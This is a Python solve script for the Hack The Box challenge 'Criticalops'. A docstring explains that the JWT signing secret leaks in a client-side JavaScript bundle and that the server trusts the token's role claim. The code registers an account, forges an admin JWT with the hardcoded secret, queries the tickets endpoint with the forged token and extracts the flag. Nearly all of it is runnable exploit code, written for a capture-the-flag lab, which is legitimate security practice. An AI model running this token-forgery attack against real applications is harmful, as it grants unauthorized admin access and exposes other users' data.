#!/usr/bin/env python3
"""
HTB Criticalops solve script.
JWT signing secret is hardcoded client-side (bundled JS chunk
/_next/static/chunks/176-eb986a17f94086c9.js) and confirmed identical to the one disclosed in
the official writeup: "SecretKey-CriticalOps-2025". No server-side session/cookie is ever set
by /api/auth/login -- the app expects the FRONTEND to generate its own JWT (role: "user") and
store it as both localStorage.authToken and a cookie. The server middleware only checks that an
`authToken` cookie is PRESENT to let /dashboard and /admin render, and trusts the JWT's `role`
claim for actual authorization on data endpoints -- so forging role: "admin" with the leaked
secret is enough.
"""
import requests, jwt, time, sys, re

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://154.57.164.72:34375"
JWT_SECRET = "SecretKey-CriticalOps-2025"

s = requests.Session()
s.verify = False
import urllib3
urllib3.disable_warnings()

username = f"beluga_{int(time.time())}"
password = "Passw0rd!123"

r = s.post(f"{BASE}/api/auth/register", json={
    "username": username, "password": password, "confirmPassword": password,
})
print("[register]", r.status_code, r.json())

r = s.post(f"{BASE}/api/auth/login", json={"username": username, "password": password})
print("[login]", r.status_code, r.json())
user = r.json()

# forge an admin JWT with the leaked client-side secret
payload = {
    "userId": user["id"],
    "username": user["username"],
    "role": "admin",
    "iat": int(time.time()),
    "exp": int(time.time()) + 8 * 3600,
}
token = jwt.encode(payload, JWT_SECRET, algorithm="HS256")
print("[forged admin token]", token)

headers = {"Authorization": f"Bearer {token}"}
cookies = {"authToken": token}

r = s.get(f"{BASE}/api/tickets", headers=headers, cookies=cookies)
print("[tickets]", r.status_code)
tickets = r.json()
for t in tickets:
    m = re.search(r"HTB\{[^}]+\}", t.get("title", "") + " " + t.get("description", ""))
    if m:
        print("\n[+] FLAG:", m.group(0))
        break
else:
    print("[!] flag not found in tickets, dumping response:")
    print(tickets)
